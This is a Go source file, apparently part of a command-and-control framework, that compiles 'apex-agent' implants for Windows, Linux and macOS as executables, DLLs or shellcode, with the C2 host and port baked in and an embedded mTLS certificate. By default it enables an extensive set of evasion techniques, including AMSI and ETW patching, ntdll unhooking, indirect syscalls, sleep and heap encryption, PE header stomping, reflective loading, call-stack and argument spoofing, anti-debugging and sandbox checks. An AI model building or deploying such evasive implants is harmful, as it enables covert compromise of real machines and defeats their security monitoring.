package builder

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ResolveAgentDir finds the agent source directory.
func ResolveAgentDir(explicit string) (string, error) {
	if explicit != "" {
		abs, err := filepath.Abs(explicit)
		if err != nil {
			return "", err
		}
		if _, err := os.Stat(filepath.Join(abs, "main.c")); err == nil {
			return abs, nil
		}
		return "", fmt.Errorf("agent dir %q has no main.c", abs)
	}
	cwd, _ := os.Getwd()
	cwdAgent := filepath.Join(cwd, "agent")
	if _, err := os.Stat(filepath.Join(cwdAgent, "main.c")); err == nil {
		return filepath.Abs(cwdAgent)
	}
	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("cannot get executable path: %w", err)
	}
	exeDir := filepath.Dir(exe)
	for _, rel := range []string{
		filepath.Join(exeDir, "..", "agent"),
		filepath.Join(exeDir, "..", "..", "agent"),
	} {
		if _, err := os.Stat(filepath.Join(rel, "main.c")); err == nil {
			return filepath.Abs(rel)
		}
	}
	return "", fmt.Errorf("agent source not found: need agent/main.c in cwd, next to bin/, or set server.agent_dir in config")
}

// Platform represents the target OS for agent builds.
type Platform string

const (
	PlatformWindows Platform = "windows"
	PlatformLinux   Platform = "linux"
	PlatformMacOS   Platform = "macos"
)

// EvasionOpts holds compile-time evasion toggles (Windows).
type EvasionOpts struct {
	SleepObfuscation bool
	SleepMethod      int    // 0=plain-XOR, 1=Ekko-ROP, 2=Foliage-APC
	UnhookNtdll      bool
	ETWPatch         bool
	AMSIPatch        bool
	IndirectSyscall  bool   // HellsGate/HalosGate indirect syscall engine
	SyscallMethod    string // "auto" | "hellsgate" | "halosgate"
	NtProcess        bool   // Replace CreateProcessA with NtCreateUserProcess (issue #7)
	HeapEncrypt      bool   // XOR-encrypt heap regions during sleep (issue #4)
	PeStomp          bool   // Overwrite MZ/PE header in-memory to defeat pe-sieve
	PeStompMode      int    // 1=DOS-only 2=full-NT-headers 3=sledgehammer
	PeStompRandomise bool   // false=zero-fill true=pseudo-random fill
	UDRL             bool   // User-Defined Reflective Loader (no PEB registration)
	DripLoad         bool   // Gradual memory allocation evasion
	RetAddrSpoof     bool   // Thread return address spoofing
	SyntheticFrames  bool   // Synthetic stack frames during sleep
	BlockDLLs        bool   // Block non-Microsoft DLLs in child processes
	ArgSpoof         bool   // Process argument spoofing
}

// PosixEvasionOpts holds compile-time evasion toggles (Linux/macOS).
type PosixEvasionOpts struct {
	AntiDebug    bool
	ProcMask     bool
	SelfDelete   bool
	EnvClean     bool
	SandboxCheck bool
}

func boolToFlag(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

// generateAgentPFX creates a self-signed client certificate for mTLS agent
// authentication. The PFX bytes are written as a C header file that gets
// compiled into the agent binary. Returns cleanup function.
func generateAgentPFX(agentDir string) (func(), error) {
	includeDir := filepath.Join(agentDir, "include")
	os.MkdirAll(includeDir, 0755)
	headerPath := filepath.Join(includeDir, "mtls_cert.h")

	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate agent key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	template := x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "apex-agent"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, fmt.Errorf("create agent cert: %w", err)
	}

	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return nil, fmt.Errorf("marshal agent key: %w", err)
	}

	// Write PEM files to temp location for openssl pkcs12 conversion
	tmpDir, err := os.MkdirTemp("", "apex-mtls-*")
	if err != nil {
		return nil, fmt.Errorf("create temp dir: %w", err)
	}

	certPath := filepath.Join(tmpDir, "agent.crt")
	keyPath := filepath.Join(tmpDir, "agent.key")
	pfxPath := filepath.Join(tmpDir, "agent.p12")

	certFile, _ := os.Create(certPath)
	pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	certFile.Close()

	keyFile, _ := os.Create(keyPath)
	pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	keyFile.Close()

	// Use openssl to create PFX (Go stdlib lacks PKCS12 export)
	cmd := exec.Command("openssl", "pkcs12", "-export",
		"-out", pfxPath,
		"-inkey", keyPath,
		"-in", certPath,
		"-passout", "pass:",
		"-legacy")
	if out, err := cmd.CombinedOutput(); err != nil {
		os.RemoveAll(tmpDir)
		return nil, fmt.Errorf("openssl pkcs12: %w\n%s", err, out)
	}

	pfxData, err := os.ReadFile(pfxPath)
	os.RemoveAll(tmpDir)
	if err != nil {
		return nil, fmt.Errorf("read PFX: %w", err)
	}

	// Write C header with embedded PFX bytes
	var sb strings.Builder
	sb.WriteString("#ifndef MTLS_CERT_H\n#define MTLS_CERT_H\n\n")
	sb.WriteString("static const unsigned char g_mtls_pfx[] = {")
	for i, b := range pfxData {
		if i%16 == 0 {
			sb.WriteString("\n    ")
		}
		fmt.Fprintf(&sb, "0x%02x", b)
		if i < len(pfxData)-1 {
			sb.WriteString(",")
		}
	}
	sb.WriteString("\n};\n")
	fmt.Fprintf(&sb, "static const unsigned int g_mtls_pfx_len = %d;\n", len(pfxData))
	sb.WriteString("\n#endif\n")

	if err := os.WriteFile(headerPath, []byte(sb.String()), 0644); err != nil {
		return nil, fmt.Errorf("write mtls_cert.h: %w", err)
	}

	cleanup := func() {
		os.Remove(headerPath)
	}
	return cleanup, nil
}

// Build builds the agent for the given platform. Returns output bytes, extension, error.
func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS, useMTLS bool,
	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) ([]byte, string, error) {

	absDir, err := ResolveAgentDir(agentDir)
	if err != nil {
		return nil, "", err
	}

	host := c2Host
	if host == "" || host == "0.0.0.0" {
		host = "127.0.0.1"
	}
	port := c2Port
	if port <= 0 {
		port = 8080
	}
	https := 0
	if useHTTPS {
		https = 1
	}

	env := append(os.Environ(),
		"C2_HOST="+host,
		fmt.Sprintf("C2_PORT=%d", port),
		fmt.Sprintf("USE_HTTPS=%d", https),
	)

	// Generate embedded client certificate for mTLS listeners
	if useMTLS && platform == PlatformWindows {
		cleanup, err := generateAgentPFX(absDir)
		if err != nil {
			return nil, "", fmt.Errorf("generate mTLS cert: %w", err)
		}
		defer cleanup()
		env = append(env, "USE_MTLS=1")
	}

	var makeTarget string
	var outFile string

	switch platform {
	case PlatformLinux:
		pev := PosixEvasionOpts{AntiDebug: true, ProcMask: true, EnvClean: true, SandboxCheck: true}
		if posixEvasion != nil {
			pev = *posixEvasion
		}
		env = append(env,
			"ENABLE_ANTI_DEBUG="+boolToFlag(pev.AntiDebug),
			"ENABLE_PROC_MASK="+boolToFlag(pev.ProcMask),
			"ENABLE_SELF_DELETE="+boolToFlag(pev.SelfDelete),
			"ENABLE_ENV_CLEAN="+boolToFlag(pev.EnvClean),
			"ENABLE_SANDBOX_CHECK="+boolToFlag(pev.SandboxCheck),
		)
		makeTarget = "linux-elf"
		outFile = "agent_linux"

	case PlatformMacOS:
		pev := PosixEvasionOpts{AntiDebug: true, ProcMask: true, EnvClean: true, SandboxCheck: true}
		if posixEvasion != nil {
			pev = *posixEvasion
		}
		env = append(env,
			"ENABLE_ANTI_DEBUG="+boolToFlag(pev.AntiDebug),
			"ENABLE_PROC_MASK="+boolToFlag(pev.ProcMask),
			"ENABLE_SELF_DELETE="+boolToFlag(pev.SelfDelete),
			"ENABLE_ENV_CLEAN="+boolToFlag(pev.EnvClean),
			"ENABLE_SANDBOX_CHECK="+boolToFlag(pev.SandboxCheck),
		)
		makeTarget = "macos-macho"
		outFile = "agent_macos"

	default: // Windows
		ev := EvasionOpts{
			SleepObfuscation: true,
			SleepMethod:      1, // Ekko by default
			UnhookNtdll:      true,
			ETWPatch:         true,
			AMSIPatch:        true,
			IndirectSyscall:  true,
			SyscallMethod:    "auto",
			NtProcess:        true,
			HeapEncrypt:      true,
			PeStomp:          true,
			PeStompMode:      2,
			PeStompRandomise: false,
			UDRL:             true,
			DripLoad:         true,
			RetAddrSpoof:     true,
			SyntheticFrames:  true,
			BlockDLLs:        true,
			ArgSpoof:         true,
		}
		if evasion != nil {
			ev = *evasion
		}
		syscallMethodInt := 0
		switch strings.ToLower(ev.SyscallMethod) {
		case "hellsgate":
			syscallMethodInt = 1
		case "halosgate":
			syscallMethodInt = 2
		default:
			syscallMethodInt = 0 // auto
		}
		env = append(env,
			"ENABLE_ETW_PATCH="+boolToFlag(ev.ETWPatch),
			"ENABLE_AMSI_PATCH="+boolToFlag(ev.AMSIPatch),
			"ENABLE_SLEEP_ENCRYPT="+boolToFlag(ev.SleepObfuscation),
			"ENABLE_UNHOOK="+boolToFlag(ev.UnhookNtdll),
			"ENABLE_INDIRECT_SYSCALL="+boolToFlag(ev.IndirectSyscall),
			fmt.Sprintf("SYSCALL_METHOD=%d", syscallMethodInt),
			"ENABLE_NT_PROCESS="+boolToFlag(ev.NtProcess),
			"ENABLE_HEAP_ENCRYPT="+boolToFlag(ev.HeapEncrypt),
			fmt.Sprintf("SLEEP_METHOD=%d", ev.SleepMethod),
			"ENABLE_PE_STOMP="+boolToFlag(ev.PeStomp),
			fmt.Sprintf("PE_STOMP_MODE=%d", ev.PeStompMode),
			"PE_STOMP_RANDOMISE="+boolToFlag(ev.PeStompRandomise),
			"ENABLE_UDRL="+boolToFlag(ev.UDRL),
			"ENABLE_DRIP_LOAD="+boolToFlag(ev.DripLoad),
			"ENABLE_RET_ADDR_SPOOF="+boolToFlag(ev.RetAddrSpoof),
			"ENABLE_SYNTHETIC_FRAMES="+boolToFlag(ev.SyntheticFrames),
			"ENABLE_BLOCK_DLLS="+boolToFlag(ev.BlockDLLs),
			"ENABLE_ARG_SPOOF="+boolToFlag(ev.ArgSpoof),
		)
		switch strings.ToLower(outputFormat) {
		case "exe":
			makeTarget = "exe"
			outFile = "agent.exe"
		case "dll":
			makeTarget = "dll"
			outFile = "agent.dll"
		case "shellcode", "bin":
			makeTarget = "shellcode"
			outFile = "agent.bin"
		case "service_exe":
			makeTarget = "exe"
			outFile = "agent.exe"
		default:
			makeTarget = "exe"
			outFile = "agent.exe"
		}
	}

	cleanCmd := exec.Command("make", "-C", absDir, "clean")
	cleanCmd.Env = env
	cleanCmd.Dir = absDir
	cleanCmd.CombinedOutput()

	cmd := exec.Command("make", "-C", absDir, makeTarget)
	cmd.Env = env
	cmd.Dir = absDir
	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("build failed: %w\n%s", err, out)
	}

	outPath := filepath.Join(absDir, outFile)
	data, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", fmt.Errorf("read built output: %w", err)
	}

	ext := filepath.Ext(outFile)
	if ext == "" {
		ext = ".elf"
		if platform == PlatformMacOS {
			ext = ".macho"
		}
	}
	return data, ext, nil
}

// BuildBase64 builds and returns base64-encoded payload and filename.
func BuildBase64(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS, useMTLS bool,
	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) (string, string, error) {

	data, ext, err := Build(agentDir, platform, outputFormat, c2Host, c2Port, useHTTPS, useMTLS, evasion, posixEvasion)
	if err != nil {
		return "", "", err
	}
	name := "apex-agent" + ext
	return base64.StdEncoding.EncodeToString(data), name, nil
}
